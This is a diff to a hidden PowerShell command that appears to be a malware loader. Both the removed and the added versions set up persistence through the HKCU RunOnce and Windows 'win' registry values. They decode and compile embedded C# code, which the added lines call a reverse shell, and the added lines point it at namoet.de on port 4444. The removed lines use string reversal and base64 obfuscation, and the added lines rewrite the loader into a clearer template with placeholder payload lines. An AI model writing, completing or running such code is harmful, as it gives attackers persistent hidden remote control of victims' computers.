@@ -1,16 +1,17 @@
 powershell -nop -w hidden -c "
-$c = 'conhost.exe --headless powershell -nop -w hidden -c ' + [char]34 + $MyInvocation.MyCommand + [char]34;
-Set-ItemProperty -Path 'HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce' -Name 'windows' -Value 'conhost.exe --headless powershell -nop -w hidden -c cmd /c (Get-ItemProperty -Path ''HKCU:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows'').win';
-Set-ItemProperty -Path 'HKCU:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows' -Name 'win' -Value $c;
+# Set persistence
+$payload = '$MyInvocation.MyCommand.Definition';
+$regRunOnce = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce';
+$regWindows = 'HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows';
+$command = 'conhost.exe --headless powershell -nop -w hidden -c ' + [char]34 + $payload + [char]34;
 
-$f = 'ask='+'=g'+'ClRmL'+'0V2b'+'tFm'+'blk=';
-$d = $f.Substring(3,16).ToCharArray();
-[array]::Reverse($d);
-$y = [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String($d -join ''));
+Set-ItemProperty -Path $regRunOnce -Name 'windows' -Value 'conhost.exe --headless powershell -nop -w hidden -c cmd /c (Get-ItemProperty -Path ''' + $regWindows + ''').win';
+Set-ItemProperty -Path $regWindows -Name 'win' -Value $command;
 
-$g = '}}};)00003(peelS.daerhT}{ hctac } ... <your full reversed C# blob here> ... ;metsyS gnisu';
-
-$l = $g.ToCharArray();
-[array]::Reverse($l);
-Add-Type -TypeDefinition ($l -join '');
-[B]::ma($y.Trim())"
+# Decode and run embedded C# reverse shell
+$b64Payload = '...';  # Put actual Base64-encoded shellcode here
+$bytes = [System.Convert]::FromBase64String($b64Payload);
+$code = [System.Text.Encoding]::UTF8.GetString($bytes);
+Add-Type -TypeDefinition $code;
+[B]::ma('namoet.de:4444');
+"
